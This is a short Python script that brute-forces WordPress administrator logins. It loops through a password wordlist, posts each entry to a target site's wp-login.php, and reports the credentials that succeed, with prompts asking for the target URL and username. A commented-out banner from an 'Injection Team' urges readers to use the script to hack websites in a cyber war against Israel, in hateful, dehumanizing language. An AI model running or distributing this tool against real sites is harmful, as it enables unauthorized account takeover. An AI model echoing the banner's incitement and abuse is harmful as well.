import requests


# messages_injection_team = """

# ===============================================================
# We're counting on you to wield our script in hacking 
# every damn website and fueling the cyber war against Israel,
# the wretched cesspool of filth. Let chaos reign and may 
# the digital battlefield tremble at your hand! 
# ===============================================================
#                         [Free Palestine]
# ===============================================================
#       Injection Team | vs | Against nothing [Israel]
# ===============================================================

# """
# print(messages_injection_team)


def brute_force_wordpress(url, username, password_file):
    session = requests.Session()
    with open(password_file, 'r') as file:
        passwords = file.readlines()
        for password in passwords:
            password = password.strip() 

            login_data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': url + '/wp-admin/',
                'testcookie': 1
            }

            response = session.post(url + '/wp-login.php', data=login_data)

            if 'wp-admin' in response.url:
                print(f"Login Successful | The Username : {username}, The Password: {password}")
                return True
            else:
                print("Incorrect Password : " + str(password))
    print("Brute force attack unsuccessful.")
    return False

if __name__ == "__main__":
    wordpress_url = input('Enter Your Target Url : ')
    target_username = input("Enter Your Target Username : ")
    password_file = input("Enter Your Wordlist Path [passwords.txt] : ")
    brute_force_wordpress(wordpress_url, target_username, password_file)
